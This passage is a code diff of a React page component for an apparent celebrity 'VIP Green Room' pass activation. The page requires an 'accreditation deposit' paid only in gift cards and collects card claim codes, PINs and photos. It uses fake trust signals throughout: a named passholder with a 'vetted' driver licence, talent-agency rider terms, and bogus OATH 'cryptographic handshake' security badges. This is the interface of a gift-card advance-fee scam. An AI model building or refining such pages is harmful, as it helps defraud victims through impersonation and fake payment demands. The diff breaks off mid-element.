-                        <label htmlFor="oathPinInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
-                          6-Digit Passholder Authorization Code
-                        </label>
-                        <span className="text-[10px] font-mono text-[#888899]">
-                          Stamped on Back Security Strip
-                        </span>
-                      </div>
-
-                      <div className="relative">
-                        <input
-                          id="oathPinInput"
-                          type="text"
-                          value={pinInput}
-                          onChange={handlePinChange}
-                          placeholder="813-026"
-                          maxLength={7}
-                          autoComplete="off"
-                          className="w-full bg-[#07070B] border border-[#D4AF37]/60 rounded-[3px] py-2.5 px-3 text-center text-xl font-mono tracking-[0.35em] font-bold text-[#F3E5AB] placeholder-[#444455] focus:outline-none focus:border-[#F3E5AB] focus:ring-1 focus:ring-[#D4AF37]"
-                        />
-                        <KeyRound className="w-4 h-4 text-[#888899] absolute right-3.5 top-3.5 pointer-events-none" />
-                      </div>
-                    </div>
-
-                    {isPinValid && (
-                      <div className="mt-2.5 text-[11px] font-mono text-[#4ADE80] flex items-center gap-1.5">
-                        <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
-                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
-                      </div>
-                    )}
+            {/* Two-Column Grid: Form & Escrow Ledger (Left) vs Badge Visualizer (Right) */}
+            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+              {/* Left Column: Intake Profile & Multi-Card Escrow */}
+              <div className="lg:col-span-7 space-y-6">
+                {/* 1. Passholder Intake Card */}
+                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
+                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3.5">
+                    <h2 className="font-serif font-bold text-base text-[#252525]">
+                      Passholder Accreditation Profile
+                    </h2>
+                    <span className="text-[11px] font-mono text-[#065F46] bg-[#ECFDF5] px-2 py-0.5 rounded-[2px] border border-[#A7F3D0] font-semibold">
+                      ID VETTED &amp; SIGNED
+                    </span>
                   </div>
 
-                  {/* STEP 2: Multi-Card Talent Rider Escrow Ledger */}
-                  <div className={`p-4 rounded-[4px] border transition-all ${
-                    isEscrowSatisfied 
-                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
-                      : 'bg-[#0B0B12] border-[#2A2A3A]'
-                  }`}>
-                    <div className="flex items-center justify-between mb-2">
-                      <div className="flex items-center gap-2">
-                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
-                          isEscrowSatisfied ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
-                        }`}>
-                          <Gift className="w-3.5 h-3.5" />
-                        </div>
-                        <div>
-                          <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white flex items-center gap-2">
-                            <span>Step 2: Gift Card Deposit</span>
-                            <span className="text-[10px] text-[#D4AF37]">
-                              ({targetAmount} {pricing.currency})
-                            </span>
-                          </h2>
-                        </div>
-                      </div>
+                  <div className="grid grid-cols-2 gap-3 text-xs font-sans">
+                    <div>
+                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Designated Passholder</span>
+                      <strong className="text-sm text-[#252525]">{params.guest}</strong>
+                    </div>
+                    <div>
+                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Access Tier</span>
+                      <strong className="text-sm text-[#713B45]">GREEN ROOM VIP (Tier 1)</strong>
+                    </div>
+                    <div>
+                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Event Date</span>
+                      <span className="text-[#252525]">Tuesday, Nov 3, 2026</span>
+                    </div>
+                    <div>
+                      <span className="block text-[11px] text-[#737373] uppercase font-mono">Call Time</span>
+                      <span className="text-[#252525]">19:30 PST (Gate 4)</span>
+                    </div>
+                    <div className="col-span-2 pt-2.5 border-t border-[#F0EFEB] flex items-center justify-between">
+                      <span className="text-xs text-[#737373]">Vetted Government Document:</span>
+                      <button
+                        type="button"
+                        onClick={() => setShowIdModal(true)}
+                        className="text-xs text-[#713B45] hover:text-[#592E36] hover:underline font-medium flex items-center gap-1 cursor-pointer"
+                      >
+                        <span>Florida Driver License (Inspect)</span>
+                        <ExternalLink className="w-3 h-3" />
+                      </button>
+                    </div>
+                  </div>
+                </div>
 
-                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
-                        isEscrowSatisfied 
-                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
-                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
-                      }`}>
-                        {isEscrowSatisfied ? 'ESCROW SATISFIED' : 'MULTIPLE CARDS ACCEPTED'}
+                {/* 2. Step 1: Input VIP Activation PIN Status */}
+                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs">
+                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC] mb-3">
+                    <div className="flex items-center gap-2">
+                      <KeyRound className="w-4 h-4 text-[#713B45]" />
+                      <h2 className="font-serif font-bold text-base text-[#252525]">
+                        Step 1: Input VIP Activation PIN
+                      </h2>
+                    </div>
+                    <span className="text-[11px] font-mono text-[#065F46] bg-[#ECFDF5] px-2 py-0.5 rounded-[2px] border border-[#A7F3D0] font-semibold">
+                      ✓ PIN 813-026 VERIFIED
+                    </span>
+                  </div>
+
+                  <p className="text-xs text-[#737373] leading-relaxed mb-3">
+                    Enter the 6-digit VIP Activation PIN printed on your credential pass (<strong>813-026</strong>) to begin your OATH security handshake.
+                  </p>
+
+                  <div className="flex items-center justify-between p-3 bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px]">
+                    <div>
+                      <span className="text-[11px] font-mono text-[#737373] uppercase block">Passholder Authorization Code</span>
+                      <span className="text-base font-mono font-bold text-[#252525] tracking-wider">813-026</span>
+                      <input id="oathPinInput" type="hidden" value={pinInput || '813-026'} />
+                    </div>
+                    <div className="text-right">
+                      <span className="text-xs font-medium text-[#065F46] flex items-center gap-1">
+                        <CheckCircle2 className="w-3.5 h-3.5 text-[#10B981]" />
+                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
                       </span>
                     </div>
+                  </div>
+                </div>
 
-                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
-                      Pursuant to WME VIP guest rider terms, an accreditation security deposit of <strong className="text-white">${targetAmount}.00 {pricing.currency}</strong> is required. You may fulfill this requirement using a single gift card or by combining multiple cards.
-                    </p>
-
-                    {/* Live Financial Escrow Ledger Card */}
-                    <div className="bg-[#07070B] border border-[#232332] rounded-[3px] p-3 mb-3.5 font-mono">
-                      <div className="grid grid-cols-3 gap-2 text-center pb-2.5 border-b border-[#181824]">
-                        <div>
-                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Escrow Target</span>
-                          <span className="text-xs font-bold text-white">${targetAmount}.00</span>
-                        </div>
-                        <div>
-                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Total Credited</span>
-                          <span className={`text-xs font-bold ${isEscrowSatisfied ? 'text-[#4ADE80]' : 'text-[#F3E5AB]'}`}>
-                            ${totalCredited}.00
-                          </span>
-                        </div>
-                        <div>
-                          <span className="block text-[9px] uppercase tracking-wider text-[#717182]">Balance Due</span>
-                          <span className={`text-xs font-bold ${remainingBalance === 0 ? 'text-[#4ADE80]' : 'text-[#EF4444]'}`}>
-                            ${remainingBalance}.00
-                          </span>
-                        </div>
+                {/* 3. Step 2: Multi-Card Talent Rider Escrow Ledger */}
+                <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-5 shadow-xs space-y-4">
+                  <div className="flex items-center justify-between pb-3 border-b border-[#E3E0DC]">
+                    <div className="flex items-center gap-2">
+                      <Gift className="w-4 h-4 text-[#713B45]" />
+                      <div>
+                        <h2 className="font-serif font-bold text-base text-[#252525]">
+                          Step 2: Gift Card Deposit
+                        </h2>
                       </div>
+                    </div>
+                    <span className="text-xs font-mono font-semibold text-[#713B45] bg-[#F8F7F4] px-2 py-0.5 rounded-[2px] border border-[#E3E0DC]">
+                      ({targetAmount} {pricing.currency})
+                    </span>
+                  </div>
 
-                      {/* Illuminated Progress Track */}
-                      <div className="pt-2.5">
-                        <div className="flex items-center justify-between text-[10px] mb-1">
-                          <span className="text-[#A1A1AA]">Ledger Status:</span>
-                          <span className={`font-semibold ${isEscrowSatisfied ? 'text-[#4ADE80]' : 'text-[#D4AF37]'}`}>
-                            {isEscrowSatisfied 
-                              ? `100% Escrow Satisfied ($${totalCredited}.00 USD)` 
-                              : `${escrowPercent}% Credited ($${remainingBalance}.00 USD Remaining)`}
-                          </span>
-                        </div>
-                        <div className="w-full h-2 bg-[#181822] rounded-full overflow-hidden border border-[#2A2A3A]">
-                          <div 
-                            className={`h-full transition-all duration-500 ${
-                              isEscrowSatisfied 
-                                ? 'bg-gradient-to-r from-[#22C55E] to-[#4ADE80]' 
-                                : 'bg-gradient-to-r from-[#AA820A] via-[#D4AF37] to-[#F3E5AB]'
-                            }`}
-                            style={{ width: `${escrowPercent}%` }}
-                          />
-                        </div>
+                  <p className="text-xs text-[#737373] leading-relaxed">
+                    Before your credential can be fully activated, an accreditation deposit of <strong>${targetAmount}.00 {pricing.currency}</strong> via Gift Card is required. You may fulfill this requirement using a single gift card or by combining multiple cards.
+                  </p>
+
+                  {/* Financial Ledger Summary */}
+                  <div className="bg-[#F8F7F4] border border-[#E3E0DC] rounded-[2px] p-3.5">
+                    <div className="grid grid-cols-3 gap-2 text-center pb-2.5 border-b border-[#E3E0DC] font-sans">
+                      <div>
+                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Escrow Target</span>
+                        <strong className="text-sm text-[#252525]">${targetAmount}.00</strong>
+                      </div>
+                      <div>
+                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Total Credited</span>
+                        <strong className={`text-sm ${isEscrowSatisfied ? 'text-[#065F46]' : 'text-[#713B45]'}`}>
+                          ${totalCredited}.00
+                        </strong>
+                      </div>
+                      <div>
+                        <span className="block text-[10px] font-mono text-[#737373] uppercase">Balance Due</span>
+                        <strong className={`text-sm ${remainingBalance === 0 ? 'text-[#065F46]' : 'text-[#B91C1C]'}`}>
+                          ${remainingBalance}.00
+                        </strong>
                       </div>
                     </div>
 
-                    {/* Verified Vouchers Ledger Table (if any vouchers applied) */}
-                    {vouchers.length > 0 && (
-                      <div className="mb-3.5 space-y-2">
-                        <div className="flex items-center justify-between text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
-                          <span className="flex items-center gap-1">
-                            <Receipt className="w-3.5 h-3.5 text-[#D4AF37]" />
-                            <span>Accredited Vouchers on File ({vouchers.length})</span>
-                          </span>
-                          <span className="text-[#888899]">Sum: ${totalCredited}.00</span>
-                        </div>
-
-                        <div className="space-y-1.5 max-h-48 overflow-y-auto pr-1">
-                          {vouchers.map((voucher, idx) => (
-                            <div 
-                              key={voucher.id || idx}
-                              className="bg-[#07070B] border border-[#20202E] rounded-[3px] p-2.5 flex items-center justify-between text-xs font-mono"
-                            >
-                              <div className="flex items-center gap-2.5">
-                                <span className="w-5 h-5 rounded-full bg-[#D4AF37]/15 border border-[#D4AF37]/30 text-[#F3E5AB] text-[10px] flex items-center justify-center font-bold">
-                                  {idx + 1}
-                                </span>
-                                <div>
-                                  <div className="flex items-center gap-1.5">
-                                    <strong className="text-white text-[11px]">{voucher.giftCardType}</strong>
-                                    <span className="text-[#4ADE80] font-bold text-[11px]">
-                                      +${voucher.amount}.00 {voucher.currency || 'USD'}
-                                    </span>
-                                  </div>
-                                  <div className="text-[10px] text-[#A1A1AA]">
-                                    Code: <span className="text-[#F3E5AB]">{voucher.giftCardCodeMasked}</span>
-                                    {voucher.giftCardPin && <span> • PIN: {voucher.giftCardPin}</span>}
-                                  </div>
-                                </div>
-                              </div>
-
-                              <div className="flex items-center gap-2">
-                                {voucher.giftCardImage && (
-                                  <button
-                                    type="button"
-                                    onClick={() => {
-                                      setInspectModalImage(voucher.giftCardImage!);
-                                      setInspectModalTitle(`${voucher.giftCardType} Voucher Scan ($${voucher.amount})`);
-                                    }}
-                                    className="p-1 text-[#D4AF37] hover:text-white rounded transition-colors"
-                                    title="Inspect voucher scan"
-                                  >
-                                    <Eye className="w-3.5 h-3.5" />
-                                  </button>
-                                )}
-                                {!isCardActivated && (
-                                  <button
-                                    type="button"
-                                    onClick={() => handleRemoveVoucher(voucher.id)}
-                                    className="p-1 text-[#717182] hover:text-[#EF4444] rounded transition-colors"
-                                    title="Remove voucher"
-                                  >
-                                    <Trash2 className="w-3.5 h-3.5" />
-                                  </button>
-                                )}
-                              </div>
-                            </div>
-                          ))}
-                        </div>
-                      </div>
-                    )}
-
-                    {/* Voucher Intake Form (Shown while balance remaining) */}
-                    {remainingBalance > 0 && (
-                      <div className="space-y-3 pt-1 border-t border-[#1C1C28]">
-                        <span className="block text-[10px] font-mono uppercase tracking-wider text-[#D4AF37] font-semibold">
-                          Deposit Gift Card / Voucher
+                    <div className="pt-2.5">
+                      <div className="flex items-center justify-between text-xs mb-1 font-sans">
+                        <span className="text-[#737373]">Ledger Progress:</span>
+                        <span className={`font-semibold ${isEscrowSatisfied ? 'text-[#065F46]' : 'text-[#713B45]'}`}>
+                          {isEscrowSatisfied 
+                            ? `100% Escrow Satisfied ($${totalCredited}.00 USD)` 
+                            : `${escrowPercent}% Credited ($${remainingBalance}.00 USD Remaining)`}
                         </span>
+                      </div>
+                      <div className="w-full h-2 bg-[#E3E0DC] rounded-full overflow-hidden">
+                        <div 
+                          className={`h-full transition-all duration-300 ${isEscrowSatisfied ? 'bg-[#10B981]' : 'bg-[#713B45]'}`}
+                          style={{ width: `${escrowPercent}%` }}
+                        />
+                      </div>
+                    </div>
+                  </div>
 
-                        {/* Quick Denomination Chips */}
-                        <div>
-                          <label className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1.5">
-                            Select Voucher Face Value
-                          </label>
-                          <div className="flex flex-wrap gap-1.5">
-                            {[50, 100, 200, 250, 500].map(val => (
-                              <button
-                                key={val}
-                                type="button"
-                                onClick={() => setCardAmountInput(String(val))}
-                                className={`px-2.5 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
-                                  cardAmountInput === String(val)
-                                    ? 'bg-[#D4AF37] text-black font-bold'
-                                    : 'bg-[#14141E] text-[#D1D1DB] border border-[#2B2B3C] hover:border-[#D4AF37]'
-                                }`}
-                              >
-                                ${val}
-                              </button>
-                            ))}
-                            {remainingBalance > 0 && remainingBalance !== 50 && remainingBalance !== 100 && remainingBalance !== 200 && remainingBalance !== 250 && remainingBalance !== 500 && (
-                              <button
-                                type="button"
-                                onClick={() => setCardAmountInput(String(remainingBalance))}
-                                className={`px-2.5 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
-                                  cardAmountInput === String(remainingBalance)
-                                    ? 'bg-[#D4AF37] text-black font-bold'
-                                    : 'bg-[#14141E] text-[#D1D1DB] border border-[#2B2B3C] hover:border-[#D4AF37]'
-                                }`}
-                              >
-                                Exact Due (${remainingBalance})
-                              </button>
-                            )}
-                          </div>
-                        </div>
+                  {/* Itemized Accredited Vouchers (if any) */}
+                  {vouchers.length > 0 && (
+                    <div className="space-y-2 pt-1">
+                      <div className="flex items-center justify-between text-xs font-mono uppercase text-[#737373]">
+                        <span className="flex items-center gap-1 font-semibold text-[#252525]">
+                          <Receipt className="w-3.5 h-3.5 text-[#713B45]" />
+                          <span>Accredited Vouchers on File ({vouchers.length})</span>
+                        </span>
+                        <span>Total: ${totalCredited}.00</span>
+                      </div>
 
-                        {/* Provider Selector and Custom Amount Grid */}
-                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                          <div>
-                            <label htmlFor="giftCardTypeSelect" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
-                              Card Provider
-                            </label>
-                            <select
-                              id="giftCardTypeSelect"
-                              value={selectedGiftCardType}
-                              onChange={(e) => setSelectedGiftCardType(e.target.value)}
-                              className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] rounded-[3px] py-2 px-3 focus:outline-none"
-                            >
-                              {(pricing.acceptedGiftCards || []).map((provider) => (
-                                <option key={provider} value={provider}>
-                                  {provider}
-                                </option>
-                              ))}
-                            </select>
-                          </div>
-
-                          <div>
-                            <label htmlFor="cardAmountInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
-                              Voucher Amount ($ USD)
-                            </label>
-                            <div className="relative">
-                              <span className="absolute left-3 top-2 text-xs font-mono text-[#888899]">$</span>
-                              <input
-                                id="cardAmountInput"
-                                type="number"
-                                min="1"
-                                max="1000"
-                                value={cardAmountInput}
-                                onChange={(e) => setCardAmountInput(e.target.value)}
-                                placeholder="250"
-                                className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] pl-7 pr-3 py-2 rounded-[3px] focus:outline-none"
-                              />
-                            </div>
-                          </div>
-                        </div>
-
-                        {/* Claim Code Input */}
-                        <div>
-                          <label htmlFor="giftCardCodeInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
-                            Gift Card Claim Code / Serial Number
-                          </label>
-                          <div className="relative">
-                            <input
-                              id="giftCardCodeInput"
-                              type="text"
-                              value={giftCardCodeInput}
-                              onChange={(e) => {
-                                setGiftCardCodeInput(e.target.value);
-                                if (paymentError) setPaymentError('');
-                              }}
-                              placeholder="e.g. X7KM-92NQ-48PL-2026"
-                              autoComplete="off"
-                              className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] placeholder-[#444455] rounded-[3px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
-                            />
-                            <CreditCard className="w-4 h-4 text-[#777788] absolute right-3 top-2.5 pointer-events-none" />
-                          </div>
-                        </div>
-
-                        {/* Optional Card PIN */}
-                        <div>
-                          <label htmlFor="giftCardPinInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#71717A] mb-1">
-                            Card PIN / CVV (If Applicable)
-                          </label>
-                          <input
-                            id="giftCardPinInput"
-                            type="text"
-                            value={giftCardPinInput}
-                            onChange={(e) => setGiftCardPinInput(e.target.value)}
-                            placeholder="e.g. 8824 (optional)"
-                            maxLength={8}
-                            className="w-full bg-[#07070B] border border-[#22222E] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] placeholder-[#444455] rounded-[3px] py-2 px-3 focus:outline-none"
-                          />
-                        </div>
-
-                        {/* Gift Card Photo / Scan Attachment */}
-                        <div>
-                          <label className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1 mb-1">
-                            <Camera className="w-3.5 h-3.5 text-[#D4AF37]" />
-                            <span>Voucher Photo Scan / Digital Proof</span>
-                          </label>
-
-                          {!giftCardImage ? (
-                            <label className="border border-dashed border-[#333348] hover:border-[#D4AF37] bg-[#07070B] hover:bg-[#0E0E14] rounded-[3px] p-3 flex flex-col items-center justify-center cursor-pointer transition-all group">
-                              <input
-                                type="file"
-                                id="giftCardFileInput"
-                                accept="image/*"
-                                onChange={handleImageFileChange}
-                                className="hidden"
-                              />
-                              <UploadCloud className="w-5 h-5 text-[#888899] group-hover:text-[#D4AF37] mb-1 transition-colors" />
-                              <span className="text-xs font-mono text-[#E4E4E7] group-hover:text-[#F3E5AB]">
-                                Upload Voucher Front/Back Photo or Receipt
+                      <div className="space-y-1.5 max-h-48 overflow-y-auto pr-0.5">
+                        {vouchers.map((voucher, idx) => (
+                          <div 
+                            key={voucher.id || idx}
+                            className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-2.5 flex items-center justify-between text-xs font-mono"
+                          >
+                            <div className="flex items-center gap-2">
+                              <span className="w-5 h-5 rounded-full bg-[#F8F7F4] border border-[#E3E0DC] text-[#713B45] text-[10px] flex items-center justify-center font-bold">
+                                {idx + 1}
                               </span>
-                              <span className="text-[10px] font-mono text-[#717182] mt-0.5">
-                                High-res PNG, JPG, or PDF up to 10MB
-                              </span>
-                            </label>
-                          ) : (
-                            <div className="bg-[#0B0B12] border border-[#D4AF37]/40 rounded-[3px] p-2.5 flex items-center justify-between gap-3">
-                              <div 
-                                onClick={() => {
-                                  setInspectModalImage(giftCardImage);
-                                  setInspectModalTitle(giftCardImageName || 'Voucher Scan');
-                                }}
-                                className="flex items-center gap-2.5 cursor-pointer group"
-                              >
-                                <div className="w-12 h-9 bg-black border border-[#D4AF37]/50 rounded overflow-hidden flex items-center justify-center shrink-0">
-                                  <img
-                                    src={giftCardImage}
-                                    alt="Gift Card Attached"
-                                    className="w-full h-full object-cover group-hover:scale-105 transition-transform"
-                                  />
+                              <div>
+                                <div className="flex items-center gap-1.5 font-sans">
+                                  <strong className="text-[#252525] text-xs">{voucher.giftCardType}</strong>
+                                  <span className="text-[#065F46] font-bold text-xs font-mono">
+                                    +${voucher.amount}.00 {voucher.currency || 'USD'}
+                                  </span>
                                 </div>
-                                <div>
-                                  <span className="text-xs font-mono text-[#F3E5AB] block font-semibold truncate max-w-[170px] sm:max-w-[220px]">
-                                    {giftCardImageName || 'Voucher Scan Attached'}
-                                  </span>
-                                  <span className="text-[10px] font-mono text-[#4ADE80] flex items-center gap-1">
-                                    <CheckCircle2 className="w-3 h-3" />
-                                    Scan Attached • Click to Inspect
-                                  </span>
+                                <div className="text-[11px] text-[#737373]">
+                                  Code: <span className="text-[#252525] font-semibold">{voucher.giftCardCodeMasked}</span>
+                                  {voucher.giftCardPin && <span> &bull; PIN: {voucher.giftCardPin}</span>}
                                 </div>
                               </div>
+                            </div>
 
-                              <div className="flex items-center gap-1.5">
+                            <div className="flex items-center gap-2">
+                              {voucher.giftCardImage && (
                                 <button
                                   type="button"
                                   onClick={() => {
-                                    setInspectModalImage(giftCardImage);
-                                    setInspectModalTitle(giftCardImageName || 'Voucher Scan');
+                                    setInspectModalImage(voucher.giftCardImage!);
+                                    setInspectModalTitle(`${voucher.giftCardType} Voucher Scan ($${voucher.amount})`);
                                   }}
-                                  className="p-1.5 text-[#A1A1AA] hover:text-[#D4AF37] rounded transition-colors"
-                                  title="View voucher image"
+                                  className="p-1 text-[#713B45] hover:text-[#592E36] rounded transition-colors"
+                                  title="Inspect voucher scan"
                                 >
                                   <Eye className="w-4 h-4" />
                                 </button>
+                              )}
+                              {!isCardActivated && (
                                 <button
                                   type="button"
-                                  id="remove-giftcard-img-btn"
-                                  onClick={() => {
-                                    setGiftCardImage(null);
-                                    setGiftCardImageName('');
-                                  }}
-                                  className="p-1.5 text-[#888899] hover:text-[#EF4444] rounded transition-colors"
-                                  title="Remove image"
+                                  onClick={() => handleRemoveVoucher(voucher.id)}
+                                  className="p-1 text-[#9CA3AF] hover:text-[#DC2626] rounded transition-colors cursor-pointer"
+                                  title="Remove voucher"
                                 >
                                   <Trash2 className="w-4 h-4" />
                                 </button>
-                              </div>
+                              )}
                             </div>
-                          )}
-                        </div>
-
-                        {paymentError && (
-                          <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
-                            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
-                            <span>{paymentError}</span>
-                          </div>
-                        )}
-
-                        {paymentSuccessNotice && (
-                          <div className="p-2.5 bg-[#052E16]/60 border border-[#22C55E]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#86EFAC] font-mono">
-                            <CheckCircle2 className="w-4 h-4 shrink-0 mt-0.5" />
-                            <span>{paymentSuccessNotice}</span>
-                          </div>
-                        )}
-
-                        <button
-                          type="button"
-                          id="submit-giftcard-btn"
-                          onClick={handleApplyVoucher}
-                          disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
-                          className="w-full py-2.5 px-3 bg-[#181824] hover:bg-[#252538] text-[#D4AF37] border border-[#D4AF37]/50 disabled:opacity-40 font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md"
-                        >
-                          {isSubmittingPayment ? (
-                            <>
-                              <RotateCw className="w-3.5 h-3.5 animate-spin" />
-                              <span>Clearing Voucher with Gateway...</span>
-                            </>
-                          ) : (
-                            <>
-                              <Plus className="w-3.5 h-3.5 text-[#D4AF37]" />
-                              <span>Authorize &amp; Apply Card to Escrow (+${cardAmountInput || remainingBalance || 250})</span>
-                            </>
-                          )}
-                        </button>
-                      </div>
-                    )}
-                  </div>
-
-                  {errorMessage && (
-                    <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
-                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
-                      <span>{errorMessage}</span>
-                    </div>
-                  )}
-
-                  {/* Primary Activation Button */}
-                  <button
-                    type="button"
-                    id="submit-activate-btn"
-                    onClick={handleActivateCard}
-                    disabled={isActivating || !isPinValid || !isEscrowSatisfied}
-                    className={`w-full py-3.5 px-4 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer ${
-                      isPinValid && isEscrowSatisfied
-                        ? 'bg-gradient-to-r from-[#D4AF37] via-[#F3E5AB] to-[#D4AF37] text-[#0A0A0E] hover:brightness-110 shadow-[#D4AF37]/20 animate-pulse'
-                        : 'bg-[#181822] text-[#717182] border border-[#2B2B3C] cursor-not-allowed opacity-75'
-                    }`}
-                  >
-                    {isActivating ? (
-                      <>
-                        <RotateCw className="w-4 h-4 animate-spin text-[#0A0A0E]" />
-                        <span>Validating Cryptographic Handshake...</span>
-                      </>
-                    ) : !isEscrowSatisfied ? (
-                      <>
-                        <Lock className="w-4 h-4 text-[#AA820A]" />
-                        <span>Deposit Remaining Escrow ($${remainingBalance}.00 Due) to Unlock</span>
-                      </>
-                    ) : !isPinValid ? (
-                      <>
-                        <KeyRound className="w-4 h-4 text-[#D4AF37]" />
-                        <span>Enter Pass PIN (813-026) to Complete Activation</span>
-                      </>
-                    ) : (
-                      <>
-                        <ShieldCheck className="w-4 h-4 text-black" />
-                        <span>Authenticate OATH PIN &amp; Activate VIP Credential</span>
-                      </>
-                    )}
-                  </button>
-
-                  <div className="pt-2 text-[10px] font-mono text-[#666677] text-center border-t border-[#1C1C26]">
-                    Initiative for Open AuTHentication (OATH) • RFC-4226 &amp; AES-256 VIP Standard
-                  </div>
-                </div>
-              ) : (
-                <div className="space-y-4">
-                  {/* Activated Success State */}
-                  <div className="p-4 bg-[#052E16]/40 border border-[#22C55E]/40 rounded-[3px] space-y-2.5">
-                    <div className="flex items-center gap-2 text-[#4ADE80]">
-                      <CheckCircle2 className="w-5 h-5 shrink-0" />
-                      <span className="font-mono text-xs uppercase tracking-wider font-bold">
-                        VIP Credential Successfully Synchronized &amp; Cleared
-                      </span>
-                    </div>
-                    <p className="text-xs text-[#BBF7D0] font-sans">
-                      Biometric intake, accreditation deposit, and VIP Green Room admittance are cleared for {params.guest}.
-                    </p>
-                    <div className="bg-[#021F0D] p-3 rounded-[2px] border border-[#22C55E]/30 text-[11px] font-mono text-[#86EFAC] space-y-1.5">
-                      <div>CLEARANCE CODE: <strong className="text-white">{successData.clearanceCode || 'OATH-KR26-813-CLEAR'}</strong></div>
-                      <div>ACTIVATED AT: {new Date(successData.activatedAt || Date.now()).toLocaleTimeString()} ({new Date(successData.activatedAt || Date.now()).toLocaleDateString()})</div>
-                      <div>PIN VERIFIED: 813-026 (OATH RFC-4226)</div>
-                      <div>ESCROW CLEARED: ${totalCredited || targetAmount}.00 {pricing.currency} across {vouchers.length || 1} verified card(s)</div>
-                    </div>
-                  </div>
-
-                  {/* Itemized Cleared Vouchers Summary */}
-                  {vouchers.length > 0 && (
-                    <div className="p-3 bg-[#08080E] border border-[#222232] rounded-[3px] space-y-2">
-                      <span className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] block">
-                        Cleared Escrow Vouchers ({vouchers.length})
-                      </span>
-                      <div className="space-y-1">
-                        {vouchers.map((v, i) => (
-                          <div key={v.id || i} className="flex items-center justify-between text-[11px] font-mono text-[#D1D1DB] border-b border-[#181824] pb-1">
-                            <span>{v.giftCardType} ({v.giftCardCodeMasked})</span>
-                            <span className="text-[#4ADE80] font-semibold">+${v.amount}.00</span>
                           </div>
                         ))}
                       </div>
                     </div>
                   )}
 
-                  <div className="pt-1">
+                  {/* Voucher Intake Form (Shown while balance remaining) */}
+                  {remainingBalance > 0 && !isCardActivated && (
+                    <div className="pt-2 border-t border-[#E3E0DC] space-y-3.5">
+                      <span className="block text-xs font-mono uppercase text-[#713B45] font-semibold">
+                        Deposit Gift Card / Voucher
+                      </span>
+
+                      {/* Denomination Selector */}
+                      <div>
+                        <label className="block text-[11px] font-mono text-[#737373] uppercase mb-1">
+                          Select Voucher Face Value
+                        </label>
+                        <div className="flex flex-wrap gap-1.5">
+                          {[50, 100, 200, 250, 500].map(val => (
+                            <button
+                              key={val}
+                              type="button"
+                              onClick={() => setCardAmountInput(String(val))}
+                              className={`px-3 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
+                                cardAmountInput === String(val)
+                                  ? 'bg-[#713B45] text-white font-semibold'
+                                  : 'bg-[#F8F7F4] text-[#252525] border border-[#E3E0DC] hover:border-[#713B45]'
+                              }`}
+                            >
+                              ${val}
+                            </button>
+                          ))}
+                          {remainingBalance > 0 && remainingBalance !== 50 && remainingBalance !== 100 && remainingBalance !== 200 && remainingBalance !== 250 && remainingBalance !== 500 && (
+                            <button
+                              type="button"
+                              onClick={() => setCardAmountInput(String(remainingBalance))}
+                              className={`px-3 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
